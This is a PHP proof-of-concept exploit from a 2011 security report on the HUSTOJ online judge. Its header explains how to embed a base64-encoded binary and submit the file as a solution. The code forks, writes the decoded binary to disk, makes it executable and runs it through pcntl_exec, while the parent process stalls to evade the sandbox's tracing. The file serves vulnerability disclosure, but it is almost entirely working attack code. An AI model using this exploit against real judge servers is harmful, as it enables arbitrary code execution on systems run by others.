<?php
/**
 * @copyright (c) 2011, OpenJudge Alliance <http://openjudge.net>
 * @author LIU Yu <pineapple.liu@gmail.com>
 * @date 2011/12/13
 * 
 * This program source code is part of the OpenJudge Alliance Technical Report 
 * (TR-OJA-201112A) at <http://openjudge.net/Report/201112A>.
 *
 * DESCRIPTION:
 * 
 * This is the arbitrary code execution exploit (i.e. Exploit 1) of the open-
 * source online judge system HUSTOJ <http://code.google.com/p/hustoj/> as 
 * discussed in the above-mentioned technical report TR-OJA-201112A.
 * 
 * To verify the security risks,
 * 
 * 1. prepare a leak program that performs something normally restricted, i.e.
 *    opening an HTTP connection to some URL on the Internet, send an email to 
 *    some address, or whatever that can verify it being executed;
 * 2. encode the binary leak program with "base64 -w0" command line utility, and
 *    place the entire base64-encoded content of the leak program to the value 
 *    of variable "code" in function child() of this program;
 * 3. submit this program to a HUSTOJ host as a PHP solution to problem 1000;
 *
 */
    function child()
    {
        $code = '<encoded content of leak program>';
        $code_cmd = './leak';
        if ($handle = @fopen($code_cmd, 'w'))
        {
            @fwrite($handle, base64_decode($code));
            @fclose($handle);
            @chmod($code_cmd, 0775);
            @pcntl_exec($code_cmd, array("0"));
        }
        return 0;
    }
    
    function traced()
    {
        /* $line = trim(fgets(STDIN));
        while ($line)
        {
            list($a, $b) = split(' ', $line);
            fputs(STDOUT, "".$a + $b."\n");
            $line = trim(fgets(STDIN));
        } */
        for ($i = 0; $i < 20000000; $i++);
        return 0;
    }
    
    $pid = @pcntl_fork();
    if ($pid == 0)
    {
        exit(child());
    }
    exit(traced());
?>